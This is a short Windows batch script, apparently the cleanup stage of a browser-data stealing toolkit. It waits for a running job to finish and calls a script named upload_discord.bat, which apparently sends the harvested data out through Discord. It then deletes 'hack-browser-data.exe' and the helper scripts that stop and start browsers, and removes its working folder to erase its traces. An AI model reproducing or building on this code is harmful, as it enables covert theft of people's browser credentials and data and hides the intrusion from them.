REM =====================
REM cleanup.bat 
REM =====================
@echo off
setlocal EnableDelayedExpansion
set "processdir=%~1"

:WAIT
timeout /t 1 /nobreak > nul
if exist "%processdir%\running.tmp" goto WAIT

REM Run Discord upload first
call upload_discord.bat

REM Clean up files
del /F /Q "%processdir%\process.bat" 2>nul
del /F /Q "%processdir%\stop_browsers.bat" 2>nul
del /F /Q "%processdir%\start_browsers.bat" 2>nul
del /F /Q "%processdir%\hack-browser-data.exe" 2>nul
del /F /Q "%processdir%\upload_discord.bat" 2>nul
move /Y "%processdir%\*.txt" "%USERPROFILE%\Desktop\" 2>nul
rmdir /S /Q "%processdir%" 2>nul
